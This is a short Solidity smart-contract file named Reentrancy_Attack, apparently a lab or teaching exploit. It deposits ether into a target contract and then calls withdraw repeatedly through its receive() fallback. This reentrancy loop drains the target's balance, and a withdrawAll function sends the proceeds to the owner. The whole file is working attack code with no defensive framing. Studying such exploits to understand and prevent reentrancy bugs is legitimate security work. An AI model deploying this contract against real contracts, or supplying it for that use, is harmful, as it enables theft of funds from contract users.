pragma solidity 0.6.0;

    interface ICounter {
        function deposit() external payable returns (bool success);
        function withdraw(uint256 _value) external payable returns (bool success);
    }

    contract Reentrancy_Attack {
        address counterAddr;
        address Owner;
        event Received(address, uint);

        constructor () public payable {
            require(msg.value >= 1 ether);
            Owner = msg.sender;
        }
    
        function setCounterAddr(address _counter) public {
        counterAddr = _counter;
        }

        function deposit_() external payable returns (bool) {
            return ICounter(counterAddr).deposit.value(1 ether)();
        }

        function withdraw_() external payable returns (bool) {
            return ICounter(counterAddr).withdraw(1000000000000000000);
        }

        function withdrawAll() public {
            require (msg.sender == Owner);
            msg.sender.call.value(address(this).balance)("");
        }

        receive() external payable {
            emit Received(msg.sender, msg.value);
            /*/ if (ICounter(counterAddr).totalSupply >= 1000000000000000000)
             {ICounter(counterAddr).withdraw(1000000000000000000);} */
            ICounter(counterAddr).withdraw(1000000000000000000);
        }
    }
